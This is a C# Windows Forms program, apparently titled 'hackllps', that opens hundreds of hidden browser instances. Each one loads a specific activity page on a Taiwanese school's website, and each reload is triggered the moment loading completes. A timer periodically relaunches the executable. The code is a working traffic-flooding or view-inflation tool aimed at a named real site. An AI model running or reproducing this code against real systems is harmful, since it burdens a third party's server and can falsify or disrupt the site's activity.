using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace hackllps
{
    
    public partial class Form1 : Form
    {
        int guys;
        BrowserII[] b;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
          webBrowser1.Url = new Uri("http://www.llps.ntpc.edu.tw/active/u_active_v2.asp?id={49EB0DCD-8C4E-4294-8AC0-2BA3A267A86E}&act_id=65");
         button1_Click(null, null);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (textBox1.Text == "guys") { throw new Exception(); }
                guys = Convert.ToInt32(textBox1.Text);
            }
            catch { guys = 500; }
            try
            {
                b = new BrowserII[guys];
                for (int i = 0; i != guys; )
                {
                    b[i++] = new BrowserII();
                }
            }
            catch { MessageBox.Show("out of meomery"); }

        }

        private void button2_Click(object sender, EventArgs e)
        {
            webBrowser1.Refresh();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("D:\\programs\\C#\\hackllps\\hackllps\\bin\\Debug\\hackllps.exe");
            Application.Exit();
        }
    }
    public class BrowserII
    {    
        private bool first = true;
       
        public BrowserII()
        {
            if (first)
            {
                b = new WebBrowser();
                b.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(b_DocumentCompleted);
                first = false;
            }
            try
            {
                b.Url = new Uri("http://www.llps.ntpc.edu.tw/active/u_active_v2.asp?id={49EB0DCD-8C4E-4294-8AC0-2BA3A267A86E}&act_id=65");
            }
            catch { }

        }

        void b_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            //throw new NotImplementedException();
            try
            {
                b.Url = new Uri("http://www.llps.ntpc.edu.tw/active/u_active_v2.asp?id={49EB0DCD-8C4E-4294-8AC0-2BA3A267A86E}&act_id=65");
            }
            catch { }
        }
        ~BrowserII()
        {
            try
            {
                b.Dispose();
            }
            catch { }
        }
        private WebBrowser b;

    }
}